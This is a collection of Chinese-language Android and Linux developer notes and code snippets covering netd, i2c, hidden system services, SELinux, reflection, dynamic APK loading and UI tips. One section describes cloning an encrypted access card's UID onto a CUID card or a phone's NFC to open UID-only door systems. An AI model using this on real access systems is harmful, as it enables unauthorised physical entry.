      registerLockingCmd(new PppdCmd());
      registerLockingCmd(new SoftapCmd());
      registerLockingCmd(new BandwidthControlCmd(), gCtls->bandwidthCtrl.lock);
      registerLockingCmd(new IdletimerControlCmd());
      registerLockingCmd(new ResolverCmd());
      registerLockingCmd(new FirewallCmd(), gCtls->firewallCtrl.lock);
      registerLockingCmd(new ClatdCmd());
      registerLockingCmd(new NetworkCommand());
      registerLockingCmd(new StrictCmd());
      registerLockingCmd(getQtiConnectivityCmd(this));
 
      initializeDataControllerLib()
  }
 
  <2>.int CommandListener::NetworkCommand::runCommand(){
     gCtls->netCtrl.addRoute();
   }
 
2.system/netd/server/NetworkController.cpp
   int NetworkController::modifyRoute(){
 
    return add ? RouteController::addRoute(interface, destination, nexthop, tableType):
                 RouteController::removeRoute(interface, destination, nexthop, tableType);
   }
 
3.system/netd/server/RouteController.cpp
  <1>. int RouteController::addRoute(){
     return modifyRoute(RTM_NEWROUTE, interface, destination, nexthop, tableType);
   }
 
  <2>.WARN_UNUSED_RESULT int modifyRoute(){
      int ret = modifyIpRoute(action, table, interface, destination, nexthop);
   }
 
  <3>.WARN_UNUSED_RESULT int modifyIpRoute(){
       return sendNetlinkRequest(action, flags, iov, ARRAY_SIZE(iov));
   }
 
  <4>.WARN_UNUSED_RESULT int sendNetlinkRequest(){
       //这里netlink不是通过ioctl()的方式与kernel通信的，而是比较特殊的socket与直接建立通信,收发数据.
       int sock = socket(AF_NETLINK, SOCK_DGRAM | SOCK_CLOEXEC, NETLINK_ROUTE);
       connect(sock, reinterpret_cast<const sockaddr*>(&NETLINK_ADDRESS));
       writev(sock, iov, iovlen);
       recv(sock, &response, sizeof(response), 0));
   }
 
4.kernel/msm-3.18/net/netlink/diag.c
  static const struct sock_diag_handler netlink_diag_handler = {
 .family = AF_NETLINK,
        .dump = netlink_diag_handler_dump,
  };
```

## Android安装使用i2c-tools

```text
Debug i2c设备驱动时，i2c-tools工具是一个很好的调试利器，看可以查看i2c总线、总线上的设备、读写寄存器值等.
For Linux: sudo apt-get install i2c-tools
1.下载i2c-tools源码
2.编译后push到android
  #mm
3.i2cdetect,i2cdump,i2cget,i2cset使用
<1>i2cdetect列举i2C有几个总线
 # i2cdetect -l
<2>列举总线所有设备，如总线5上的i2c设备
 # i2cdetect -y -r 5
 注意：发现 I2C 设备的位置显示为UU或者表示设备地址的数值，UU(或:0x5d表示)表示该设备在 driver 中被使用。
<3>dump第5总线上0x5d i2c设备地址(UU)的所有寄存器值
 # i2cdump -y -f 5 0x5d
<4>i2cget获取第5个总线上0x5d i2c设备0x20地址的寄存器值
 # i2cget -y -f  5  0x5d  0x20
<5>i2cset设置第5个总线上设备地址为0x5d，寄存器地址为0x55的值为0x01
 # i2cset -y -f  5  0x5d  0x55 0x01
<6>i2cdump，i2cset，i2cget双字节命令，后面加 w
 # i2cdump -y -f 5 0x5d w
 # i2cset -y -f  5  0x5d  0x55 0x010B w
 # i2cget -y -f  5  0x5d  0x20 w
```

## Android命令行读写i2c寄存器操作

```text
写命令格式：
寄存器地址 长度  数据

读命令格式：
echo “寄存器地址” > getreg
cat getreg

1.使能寄存器
adb shell "echo "0x01,0x01,{0xff}" > /sys/bus/i2c/devices/1-20/setreg"
2.禁掉寄存器
adb shell "echo "0x01,0x01,{0x00}” > /sys/bus/i2c/devices/1-20/setreg"
3.读寄存器
adb shell "echo "0x01" > /sys/bus/i2c/devices/1-20/getreg"
adb shell "cat /sys/bus/i2c/devices/1-20/getreg"
```

## [串口] Android5.1使用SerialManagerService

```text
安卓原始代码中的串口SerialPort SerialManger SerialService  ISerialService.aidl 等都是@hide隐藏的，外部应用无法调用，定制需要，所以将该Manager启用。下面记录下过程
1.启用SerialService
其掉这三个文件中的@hide标识：

frameworks/base/core/Java/Android/hardware/SerialManager.java

frameworks/base/core/java/android/hardware/SerialPort.java

frameworks/base/core/java/android/hardware/ISerialManager.aidl

SerialService文件位置：

frameworks/base/services/java/com/android/server/SerialService.java

该服务会在SystemSever.java中进行初始化，这里还需要将Context.java中的SERIAL_SERVICE的@hide去掉：

frameworks/base/core/java/android/content/Context.java

-    /*
-     * @hide
-     */
     public static final String SERIAL_SERVICE = "serial";

还有，SerialService是通过读取R.array.config_serialPorts这个String array来加载的/dev/设备节点：

public SerialService(Context context) {
    mContext = context;
    mSerialPorts = context.getResources().getStringArray(com.android.internal.R.array.config_serialPorts);
}

所以还需要添加下，文件位置：

framework/base/core/res/res/values/config.xml

在config_serialPorts中添加相应设备节点

<!-- List of paths to serial ports that are available to the serial manager. for example, /dev/ttyUSB0 -->
<string-array translatable="false" name="config_serialPorts">
    <item>"/dev/ttyS0"</item>
</string-array>

在使用时应用需要添加uses-permission权限 android.permission.SERIAL_PORT ;

2.安卓提供了个测试工具，在framework/base/tests/SerialChat， 可以进入该目录， 输入mm 进行编译，输出在 out/target/product/xxx/data/app/中，可以push到手机里验证。

3.权限授权问题，  我在测试这个SerialChat程序时发现android.permission.SERIAL_PORT并未被授权， 通过pm.checkPermission("android.permission.SERIAL_PORT", pinfo.packageName) 检查可以看到。

查看frameworks/base/core/res/AndroidManifest.xml中发现，该permission定义如下：

<!-- Allows applications to access serial ports via the SerialManager. -->
<permission android:name="android.permission.SERIAL_PORT"
    android:label="@string/permlab_serialPort"
    android:description="@string/permdesc_serialPort"
    android:protectionLevel="signature|system" />

可以看到protectionLevel是signature|systeml; 

signature表示当申请此权限的应用程序的签名与声明此权限的应用的签名相同时才会授权， 该应用是framwork-res.apk，使用的签名是platform，所以需要应用也要使用platform签名。

system表示是系统应用;

所以这里修改Android.mk，添加LOCAL_CERTIFICATE := platform 再重新编译

LOCAL_PATH:= $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE_TAGS := tests
LOCAL_CERTIFICATE := platform
LOCAL_SRC_FILES := $(call all-subdir-java-files)
LOCAL_PACKAGE_NAME := SerialChat
include $(BUILD_PACKAGE)
```

## Android隐藏类的使用

```text
1. 首先查找源码，找到了IWindowManager.aidl文件，将源码按照相同的路径在自己的工程中创建
注:eclipse工程必须有此步骤, 而Android源码编译的话不需要此步骤.
Sample 1:
IWindowManager windowMger；
try{
    Object object = new Object();
    Method getService = Class.forName("android.os.ServiceManager").getMethod("getService", String.class);
    Object obj = getService.invoke(object, new Object[] {new String("window")});
    windowMger = IWindowManager.Stub.asInterface((IBinder)obj);
}catch(ClassNotFoundException ex){
}catch(NoSuchMethodException ex){
}catch(IllegalAccessException ex){
}catch(InvocationTargetException ex){
}

Sample 2:
import android.os.ServiceManager;
ITelephony.Stub.asInterface(ServiceManager.getService("phone")).answerRingingCall();
```

## [知识点] Git/Repo/Gerrit区别

```text
1. Git: Git是一个开源的分布式版本控制系统，用以有效、高速的处理从很小到非常大的项目版本管理.
2. Repo: Repo是谷歌用Python脚本写的调用git的一个脚本,Repo实现管理多个git库。主要是用来下载、管理Android项目的软件仓库(也就是说Repo是用来管理给Git管理的一个个仓库的).
3. Gerrit(代码评审工具): 基于 Web 的代码评审和项目管理的工具，面向基于 Git 版本控制系统.
```

## [开源] 编译ffmpeg、SDL、x264开源库 for ubuntu

```text
一、Build ffmpeg for Linux
地址：https://ffmpeg.org/download.html#releases
1、./configure --disable-yasm --disable-static --enable-shared
2、make -j8
3、sudo make install

二、Build SDL for Linux
地址：http://www.libsdl.org/download-2.0.php
1、./configure
2、make -j8
3、sudo make install

三、Build x264开源库
地址：http://www.videolan.org/developers/x264.html

1、./configure
2、make -j8
3、sudo make install 

四、播放yuv视频命令
ffplay -f rawvideo -video_size 1920x1080 Cam320x240-888.yuv
```

## [Snippet] 屏蔽掉下拉通知栏和状态栏

```text
.\frameworks\base\packages\SystemUI\src\com\android\systemui\statusbar\phone\PhoneStatusBarView.java
    @Override
    public void addPanel(PanelView pv) {
        super.addPanel(pv);
//        if (pv.getId() == R.id.notification_panel) {
//            mNotificationPanel = pv;
//        } else if (pv.getId() == R.id.settings_panel){
//            mSettingsPanel = pv;
//        }
        pv.setRubberbandingEnabled(!mFullWidthNotifications);
    }
```

## 如果显示有误，除字库外需要注意的地方是安卓字型相关解析

```text
external\harfbuzz\src\harfbuzz-myanmar.c
```

## [selinux] Android5.1/7.1 Selinux JNI访问新增/dev/xxx设备节点

```text
1、以/dev/test节点为例，在device/init.rc增加
on boot
//android5.0以下到此即可访问,5.0以上设置2-4步
  chmod 777 /dev/test
 
2、在extern/sepolicy/file_contexts 或／device/sepolicy/file_contexts增加
//设备名：test_device
/dev/test  u:object_r:test_device:s0 
 
3、在extern/sepolicy/device.te 增加
//类型：dev_type
//For Android5.1
type  test_device, dev_type;  
//For Android7.0以上版本:这一attribute包含了所有能越过MLS检查的客体type
type  test_device, dev_type,mlstrustedobject; 
 
4、允许系统app访问/dev/test，在extern/sepolicy/system_app.te增加
//访问设备的进程：system_app
allow system_app test_device:chr_file  rw_file_perms; 
 
5、编译烧写
# mmm /device/sepolicy
# make ramdisk 
6、测试
int fd = open("/dev/test",O_RDONLY);  
```

## [Snippet] Provision源码分析

``packages/apps/Provision/src/com/android/provision/DefaultActivity.java``

```textjava
Provision主要作用是作为开机引导用户进行一些基本设置。但是在原生的 android 系统中，这个 provision 非常的简单，只有一个空白的 activity，这个主要就是留给 厂商自己定制的,
在Android中，寻找Launcher的时候是根据HOME的filter（在Manifest中定义的<category android:name="android.intent.category.HOME" />）来过滤，而Provision的DefaultActivity中不仅配置了category.HOME，还增加了<intent-filter android:priority="1">,
<activity android:name="DefaultActivity" android:excludeFromRecents="true">
    <intent-filter android:priority="1">
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.HOME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
配置了权限为1，默认为0，如果有两个相同权限的，则弹框让用户选择启动哪一个。

DefaultActivity代码如下：
public class DefaultActivity extends Activity {
    @Override
    protected void onCreate(Bundle icicle) {
        super.onCreate(icicle);
        // Add a persistent setting to allow other apps to know the device has been provisioned.
        Settings.Global.putInt(getContentResolver(), Settings.Global.DEVICE_PROVISIONED, 1);
        Settings.Secure.putInt(getContentResolver(), Settings.Secure.USER_SETUP_COMPLETE, 1);
        // remove this activity from the package manager.
        PackageManager pm = getPackageManager();
        ComponentName name = new ComponentName(this, DefaultActivity.class);
        pm.setComponentEnabledSetting(name, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        // terminate the activity.
        finish();
    }
}

可以在onCreate()方法里面添加其他方法如：默认关闭USB debug：
Settings.Secure.putInt(getContentResolver(), Settings.Secure.ADB_ENABLED, 0);  //0代表关闭，1代表打开

1、设置标签Settings.Global.DEVICE_PROVISIONED,标志代表了Android系统已过完开机向导准备完成，可以正常工作
2、禁止Provision自己的Activity组件

void setComponentEnabledSetting (ComponentName componentName, int newState, int flags) 
componentName：组件名称 
newState：组件新的状态，可以设置三个值，分别是如下：

不可用状态：COMPONENT_ENABLED_STATE_DISABLED
可用状态：COMPONENT_ENABLED_STATE_ENABLED
默认状态：COMPONENT_ENABLED_STATE_DEFAULT
```

## Android自带的常用注解

```text
1、在注释中实现链接跳转
/**
 * ... ...
 * @see #invalidate()
 * @see #postInvalidateDelayed(long)
 */

2、限定参数类型
TextView.setTextColor(@ColorInt int color)

3、限定参数类型及范围
TimePicker.setHour(@IntRange(from = 0, to = 23) int hour)

public static class ByteArray {
 private @IntRange(from = 0) int mSize;
}

public class TextView ...{
    @FloatRange(from = 0.0, to = 1.0)
    private float getHorizontalFadingEdgeStrength(float position1, float position2) {
        final int horizontalFadingEdgeLength = getHorizontalFadingEdgeLength();
        if (horizontalFadingEdgeLength == 0) return 0.0f;
        final float diff = Math.abs(position1 - position2);
        if (diff > horizontalFadingEdgeLength) return 1.0f;
        return diff / horizontalFadingEdgeLength;
    }
}
```

## [Snippet] Android再次点击返回键退出

```text
//声明一个long类型变量：用于存放上一点击“返回键”的时刻
private long mExitTime;
@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
    //判断用户是否点击了“返回键”
    if (keyCode == KeyEvent.KEYCODE_BACK) {
        //与上次点击返回键时刻作差
        if ((System.currentTimeMillis() - mExitTime) > 2000) {
            //大于2000ms则认为是误操作，使用Toast进行提示
            Toast.makeText(this, "再按一次退出程序", Toast.LENGTH_SHORT).show();
            //并记录下本次点击“返回键”的时刻，以便下次进行判断
            mExitTime = System.currentTimeMillis();
        } else {
            //小于2000ms则认为是用户确实希望退出程序-调用System.exit()方法进行退出
            System.exit(0);
        }
        return true;
    }
    return super.onKeyDown(keyCode, event);
}
```

## wrap_content不生效的原因和解决方案

```text
https://blog.csdn.net/carson_ho/article/details/62037760
@Override
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
    super.onMeasure(widthMeasureSpec, heightMeasureSpec);
    // 获取宽-测量规则的模式和大小
    int widthMode = MeasureSpec.getMode(widthMeasureSpec);
    int widthSize = MeasureSpec.getSize(widthMeasureSpec);

    // 获取高-测量规则的模式和大小
    int heightMode = MeasureSpec.getMode(heightMeasureSpec);
    int heightSize = MeasureSpec.getSize(heightMeasureSpec);

    // 设置wrap_content的默认宽 / 高值
    // 默认宽/高的设定并无固定依据,根据需要灵活设置
    // 类似TextView,ImageView等针对wrap_content均在onMeasure()对设置默认宽 / 高值有特殊处理,具体读者可以自行查看
    int mWidth = 400;
    int mHeight = 400;

    // 当布局参数设置为wrap_content时，设置默认值
    if (getLayoutParams().width == ViewGroup.LayoutParams.WRAP_CONTENT && getLayoutParams().height == ViewGroup.LayoutParams.WRAP_CONTENT) {
        setMeasuredDimension(mWidth, mHeight);
    // 宽 / 高任意一个布局参数为= wrap_content时，都设置默认值
    } else if (getLayoutParams().width == ViewGroup.LayoutParams.WRAP_CONTENT) {
        setMeasuredDimension(mWidth, heightSize);
    } else if (getLayoutParams().height == ViewGroup.LayoutParams.WRAP_CONTENT) {
        setMeasuredDimension(widthSize, mHeight);
    }
}
```

## [Snippet] 获取系统时间的几种方法的区别

```text
static long currentThreadTimeMillis()
    //Returns milliseconds running in the current thread.
static long elapsedRealtime()
    //Returns milliseconds since boot, including time spent in sleep.
static long elapsedRealtimeNanos()
    //Returns nanoseconds since boot, including time spent in sleep.
static boolean setCurrentTimeMillis(long millis)
    //Sets the current wall time, in milliseconds.
static void sleep(long ms)
    //Waits a given number of milliseconds (of uptimeMillis) before returning.
static long uptimeMillis()
    //Returns milliseconds since boot, not counting time spent in deep sleep.
```

## [暗码] 查看Android手机与谷歌服务的通信状态日志

```text
在开发谷歌服务相关的东西或者使用谷歌服务相关的东西时，在判断和查找当前操作的问题时，谷歌服务当前的连接状态就异常重要了。不然谷歌服务都没连上，一味的折腾自己的程序也不能解决问题。

使用手机指令查看谷歌服务状态
*#*#426#*#* 可以查看 google service 相关状况。
```

## [Snippet] 获取android_id

```text
表示一个64位的数字，在设备第一次启动的时候随机生成并在设备的整个生命周期中不变。（如果重新进行出厂设置可能会改变）
Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID)
```

## TextView的drawableLeft与文本无法一起居中显示

```text
需求场景 ：
TextView设置的文本默认是存在一个上下间距的，也就是上下空白，当我们在使用drawableLeft的时候，这个默认的空白会使TextView中的文本向下偏移，当你的drawableLeft使用的icon很小，文字的size也很小的时候，即使你设置了android:gravity="center"，也能很明显的看到你的TextView中的文本基本上是与icon处于底边对其，而不是居中对齐（最好是在真机看，AS的Preview是没办法看到这种效果的，没办法，谁叫我们的UI是个“像素眼”，这细节揪的啊!）。

解决方法：
只要TextView中加上 android:includeFontPadding 这个属性属性就可以了!
```

## [Snippet] AtomicInteger简介

```text
/**
 * 来看AtomicInteger提供的接口。
 * 
 * //获取当前的值
 * 
 * public final int get()
 * 
 * //取当前的值，并设置新的值
 * 
 * public final int getAndSet(int newValue)
 * 
 * //获取当前的值，并自增
 * 
 * public final int getAndIncrement()
 * 
 * //获取当前的值，并自减
 * 
 * public final int getAndDecrement()
 * 
 * //获取当前的值，并加上预期的值
 * 
 * public final int getAndAdd(int delta)
 * 
 * 
 * 
 */
public class AtomicIntegerDemo {
    public static void main(String[]  args) {
        AtomicInteger ai = new AtomicInteger(0);
        int i1 = ai.get();
        v(i1);
        int i2 = ai.getAndSet(5);
        v(i2);
        int i3 = ai.get();
        v(i3);
        int i4 = ai.getAndIncrement();
        v(i4);
        v(ai.get());
    }
    static void v(int i) {
        System.out.println("i : " + i);
    }
}
```

## [Snippet] Android判断某个点是否在View的区域内

```text
private boolean isInViewArea(View view, float x, float y) {
    Log.e(MainActivity.class.getName(), "x " + x + "y " + y);
    Rect r = new Rect();
    view.getLocalVisibleRect(r);
    Log.e(MainActivity.class.getName(), "left " + r.left + "right " + r.right);
    if (x > r.left && x < r.right && y > r.top && y < r.bottom) {
        return true;
    }
    return false;
}
```

## [Snippet] 获取Android系统自带的UA

```text
String userAgent = System.getProperty("http.agent");
```

## [Snippet]  [反射] Android利用反射实现不安装直接运行APK(动态加载)

```text
public void loadAPK(Bundle paramBundle, String dexpath, String dexoutputpath) {
    ClassLoader localClassLoader = ClassLoader.getSystemClassLoader();
    DexClassLoader localDexClassLoader = new DexClassLoader(dexpath, dexoutputpath, null, localClassLoader);
    try {
        PackageInfo plocalObject = getPackageManager().getPackageArchiveInfo(dexpath, 1);
        if ((plocalObject.activities != null) && (plocalObject.activities.length > 0)) {
            String activityname = plocalObject.activities[0] .name;  
            Log.d(TAG, "activityname = " + activityname);  
            Class localClass = localDexClassLoader.loadClass(activityname);  
            Constructor localConstructor = localClass.getConstructor(new Class[]  {});
            Object instance = localConstructor.newInstance(new Object[]  {});  
            Log.d(TAG, "instance = " + instance);  
            Method localMethodSetActivity = localClass.getDeclaredMethod("setActivity", new Class[]  { Activity.class });
            localMethodSetActivity.setAccessible(true);
            localMethodSetActivity.invoke(instance, new Object[]  { this });
            Method methodonCreate = localClass.getDeclaredMethod("onCreate", new Class[]  { Bundle.class });
            methodonCreate.setAccessible(true);
            methodonCreate.invoke(instance, new Object[]  { paramBundle });
        }
        return;
    } catch (Exception ex) {
        ex.printStackTrace();
    }
}
```

## [Browser] Chrome 无插件不重启换UA

```text
Chrome 无插件不重启换UA,看起来神奇吗?其实一点都不神奇,通过我们的开发者工具能够完美,快速切换UA,还不用插件,也不用加命令行,下面打开开发者模式.
按下键盘F12,打开开发者控制版
切换到UA控制,Override User Agent改掉UA吧!比如我改成Tater Blog,访问别的网站就有了这个UA了!
```

## [Snippet] android WebView 文字、图片分开加载

```text
webSettings.setBlockNetworkImage(true);
public void onPageFinished(WebView view, String url) {
    webSettings.setBlockNetworkImage(false);
    super.onPageFinished(view, url);
}
```

## [Snippet] android 获取控件在布局中的位置

```text
@Override
public void onWindowFocusChanged(boolean hasFocus) {
 super.onWindowFocusChanged(hasFocus);
 int[]  location = new int[2] ;
 gEditText.getLocationInWindow(location);
 Log.e("getLocationInWindow", "x" + location[0]  + "y:" + location[1] );
 int[]  location2 = new int[2] ;
 gEditText.getLocationOnScreen(location2);
 Log.e("getLocationOnScreen", "x" + location2[0]  + "y:" + location2[1] );
}

getLocalVisibleRect， 返回一个填充的Rect对象，  ?? sdk上也没注释,根据经验应该是获取控件相对在父亲里的一个Rect对象，left，top取到的是0
getGlobalVisibleRect， 获取全局坐标系的一个视图区域， 返回一个填充的Rect对象。 但是！！！ left能准确的获取， bottom属性就获取不准确， 不知道杂搞的
getLocationOnScreen，计算该视图在全局坐标系中的x，y值， 非常准确！（注意这个值是要从屏幕顶端算起，也就是索包括了通知栏的高度）
getLocationInWindow，计算该视图在它所在的widnow的坐标x，y值， 非常准确！ 这个好像和getLocationOnscreen 一样
getLeft , getTop, getBottom, getRight,  这一组是获取相对在它父亲里的坐标
```

## [爬虫] Python爬取音标

```text
# -*- coding: UTF-8 -*-
import requests
import time
from bs4 import BeautifulSoup
f = open('./words.txt')
fw = open('./result.txt','a')

line = f.readline()
index = 0
while line:
    index = index+1
    url = "https://www.oxfordlearnersdictionaries.com/definition/english/" + line.strip()
    print(str(index) + ":" + url)
    wbdata = requests.get(url,headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36'}).text
    soup = BeautifulSoup(wbdata,'html.parser')
    news_titles = soup.select("span.pron-g > span.phon")
    # print(news_titles)
    result = ''
    for n in news_titles:
        title = n.get_text()    
        if 'NAmE' in title:
            result += '['+title.replace('NAmE','').replace('//','') + '] '
    print(result)
    fw.write((result + "\n").encode("utf-8"))
    line = f.readline()
    time.sleep(0.1)

fw.close()
f.close()
```

## [Snippet] android 获取UUID

```text
public static String getUniquePsuedoID() {
    String m_szDevIDShort = "35" + (Build.BOARD.length() % 10) + (Build.BRAND.length() % 10) + (Build.CPU_ABI.length() % 10) + (Build.DEVICE.length() % 10) + (Build.MANUFACTURER.length() % 10) + (Build.MODEL.length() % 10) + (Build.PRODUCT.length() % 10);
    String serial = null;
    try {
        serial = android.os.Build.class.getField("SERIAL").get(null).toString();
        return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
    } catch (Exception e) {
        serial = "serial";
    }
    return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
}
```

## [开源]  [log] 将log显示在屏幕上的库

```text
https://github.com/inaka/galgo
```

## [Snippet]  [反射] Java反射使用--通知栏回收

```text
Class<?> serviceManagerClass;
serviceManagerClass = Class.forName("android.os.ServiceManager");
Method getService = serviceManagerClass.getMethod("getService", String.class);
IBinder retbinder = (IBinder) getService.invoke(serviceManagerClass, "statusbar");
Class<?> statusBarClass = Class.forName(retbinder.getInterfaceDescriptor());
Object statusBarObject = statusBarClass.getClasses()[0] .getMethod("asInterface", IBinder.class).invoke(null, new Object[]  { retbinder });
Method collapsePanels = statusBarClass.getMethod("collapsePanels");
collapsePanels.setAccessible(true);
collapsePanels.invoke(statusBarObject);
```

## [Snippet] 预置数据库文件到assets文件中，并拷贝到/data/data/PACKAGE_NAME/databases 目录下

```text
private void copyDataBase() throws IOException {
 Log.d(LOG_TAG, "copyDataBase");
 // Open your local db as the input stream
 InputStream myInput = mContext.getAssets().open(DATABASE_NAME);

 // Path to the just created empty db
 String outFileName = DATABASE_PATH + DATABASE_NAME;

 // Open the empty db as the output stream
 OutputStream myOutput = new FileOutputStream(outFileName);

 // transfer bytes from the inputfile to the outputfile
 byte[]  buffer = new byte[1024] ;
 int length;
 while ((length = myInput.read(buffer)) > 0) {
  myOutput.write(buffer, 0, length);
 }

 // Close the streams
 myOutput.flush();
 myOutput.close();
 myInput.close();
}
```

## [Snippet] back键实现home键的功能

```text
public void onBackPressed() { 
    //实现Home键效果 
    //super.onBackPressed();这句话一定要注掉,不然又去调用默认的back处理方式了 
    Intent i = new Intent(Intent.ACTION_MAIN); 
    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
    i.addCategory(Intent.CATEGORY_HOME); 
    startActivity(i);  
}
```

## [NFC] NFC手机模拟加密门禁卡

```text
https://hceng.cn/2019/07/12/NFC%E6%89%8B%E6%9C%BA%E6%A8%A1%E6%8B%9F%E5%8A%A0%E5%AF%86%E9%97%A8%E7%A6%81%E5%8D%A1/

首先，加密卡在目前这个情况下是无法解密的，如果按照下面的操作失败，请参考下一章。
部分门禁系统只认证IC卡的UID，利用这一情况，可以试试复制门禁卡的UID，看运气能否打开门。

在已root的情况下，直接使用APP NFC卡模拟 便可读取加密卡的UID和非加密数据、并写UID到手机NFC里。
在未root的情况下，使用小米系统自带的门卡模拟功能，出于安全考虑，是不能对加密卡进行任何操作。手机的NFC，理论上可以读加密IC卡的UID，因此可以使用第三方软件MifareClassicTool读取UID，因为没有root，不能写手机NFC，但可以写IC卡，因此还需要一张CUID卡(不能使用UID卡)，某宝上一块多一张，思路就是先读取加密卡的UID，再读取CUID卡的数据，然后将CUID卡的UID改为加密卡一样的UID，再将修改后的数据写回到CUID卡，最后用小米系统自带的门卡模拟功能，复制未加密的CUID卡即可。
```

## [工具] ChkBugReport的使用

```text
https://blog.csdn.net/tkwxty/article/details/97959066
```

## 云手机实现思路

```text
个人整理的实现思路如下：
1、云手机万物基于arm，购买开发板跑kvm+qmeu或者购买arm服务器。
2、安装linux系统以及kvm+qemu虚拟化，派生arm虚拟机。
3、arm虚拟机内搭建Android开发板模拟环境，编译调整Android驱动打包虚拟机并启动Android。
4、通过vnc远程控制接入arm虚拟机(也就是Android开发板模拟环境)。
5、整套流程跑通Java就该上场了，既然做云手机那么就需要增删改查自动化操作100台手机->云管平台开发！
6、整理libvirt api的官方文档，派生虚拟机，销毁、关闭、启动。等等虚拟机层面的操作
7、服务器内的一台台虚拟机需要通过vnc来控制以及传输画面，需要做图像压缩虚拟按键控制操作。
8、上云手机的目的就是为了批量，那么adb的端口以及脚本需要定制化一部分出来。喜欢玩大数据的公司或者机构一定需要xposed框架。
9、前端的UI界面后台的管理系统自行定义。
提醒：市面上有一些手机云管平台 是基于x86架构做的arm指令集转换。并且Android系统用的是Androidx86，在性能上没法商用。(建议感兴趣的用物理arm环境)
```

## 如何利用安卓手机搭建WEB服务器

```text
工具/原料
root软件：百度root为佳!如果你已经获取了权限，可以跳过。
ksweb软件：用于搭建手机php服务器的软件。
nat123软件：强大的内网端口映射软件，不需要路由器权限。
方法/步骤
1.安装手机本地php+mysql服务器环境篇 ：
1.1安装ksweb软件，安装好ksweb后，会在手机上生成一个文件夹htdocs，其目录是mnt/sdcard/htdocs，htdocs是网站的根目录。
1.2安装mysql 直接点击mysql管理，点击选择“是”然后解压便可自动安装。mysql的账号密码随后再改(在设置里面更改)。
1.3安装好MySQL之后，我们需要对ksweb进行一些设置方可更好使用。
1.3.1端口的更改步骤:(启用root→更改80端口)手机服务器启用root，在ksweb设置里面把root打钩。
1.3.2开启手机80端口方法:把8080端口改为80端口，并把PHP服务，MySQL都打勾。其他一些设置比如MySQL密码，开机自启动等选项大家根据需要自行修改即可!
1.4ksweb全部设置好后，我们打开手机本地服务器地址localhost:80，表示设置好了。
我们点击页面中的“Enter KSWEB Web Interface”可以看到手机服务器的一些配置信息(默认账号密码都是“admin”)，表示手机服务搭建成功，一切正常!
2.利用nat123软件进行内网80端口映射篇：
2.1注册账号，我们先到其官网注册账号官网,大家百度nat123即可。
2.2登陆并添加域名解析。
2.2.1 应用名称，要搭建自己的博客，可以填XX的博客，或者XX的个人博客等。
2.2.2 内网端口，只有root的手机才填80端口。
2.2.3 内网地址这个默认localhost就行。
2.2.4 外网域名，如果没有自己的域名，可以用官方免费的二级域名，注意格式，一切填好之后，点击确认保存即可!
2.3 下载并安装登陆安卓版的nat123,就自动解析了。
3.4 接下来在另一台电脑上输入刚才的域名访问，表示安卓手机web服务器安装成功，网站搭建成功!
注意事项
另外如果需要手机网站一直都可以访问，需要下载一个永不关屏软件，这样手机就不会进入睡眠状态，服务也不会停止，不过比较耗电。
外网能访问内网手机web服务器的关键是nat123端口映射功能，利用nat123端口映射功能，不只是搭建内网网站，还可以挖掘其他的许多用途。
```

## [Snippet] 不需要Context的显示Dialog

```text
弹出一个AlertDialog，不一定需要Activity级别的Context，而且任何地方都有办法弹出一个AlertDialog，只要是在Application的attachBaseContext之后。

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.WindowManager;
import java.lang.reflect.Method;

public class Alert {
    public static void alertDialog() {
        Context mAppContext = null;
        try {
            Class<?> clazz = Class.forName("android.app.ActivityThread");
            Method method = clazz.getDeclaredMethod("currentApplication", new Class[0] );
            mAppContext = (Context) method.invoke(null, new Object[0] );
        } catch (Throwable e) {
            e.printStackTrace();
            return;
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(mAppContext);
        builder.setTitle("Hi")
               .setMessage("Hello World");
               .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
     }
          })
          .setNegativeButton("取消", new DialogInterface.OnClickListener() {
              @Override
              public void onClick(DialogInterface dialog, int which) {
              }
          });
        AlertDialog dialog = builder.create();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_TOAST);
        } else {
            dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_PHONE);
        }
        dialog.show();
    }

    private static Handler handler;

    public static void alertAnyWhere() {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            alertDialog();
        } else {
            if (handler == null) {
                handler = new Handler(Looper.getMainLooper());
            }
            handler.post(new Runnable() {
                @Override
                public void run() {
                    alertDialog();
                }
            });
        }
    }
}

ContentProvider的onCreate()方法先于Application的onCreate()方法执行，晚于Application的attachBaseContext()方法，所以在ContentProvider的onCreate()时候也是有办法弹出一个AlertDialog的。

BroadCastReceiver回调onReceive(Context context,Intent intent)中的context类型各种场景相差很大，静态注册的receiver回调的Context都是ReceiverRestrictedContext，动态注册的receiver有可能是Activity或Application。
```

## [图片] Android大图加载库

```text
https://github.com/LuckyJayce/LargeImage
```

## [Snippet] instanceOf 的另外一种写法

```text
if (Activity.class.isInstance(mContext)) {
```

## [clock] 日期格式化使用 YYYY-MM-dd 的潜在问题

```text
其实很简单，就是 把 yyyy-MM-dd 写成了 YYYY-MM-dd 。

如果对时间处理不那么熟悉的程序员看到这里，会认为 yyyy 和 YYYY 有什么区别么?在代码里面敲一下，他们的结果也都是相同的啊！

public class DateTest {
    public static void main(String[]  args) {
        Calendar calendar = Calendar.getInstance();
        calendar.set(2019, Calendar.AUGUST, 31);
        Date strDate = calendar.getTime();
        DateFormat formatUpperCase = new SimpleDateFormat("yyyy-MM-dd");
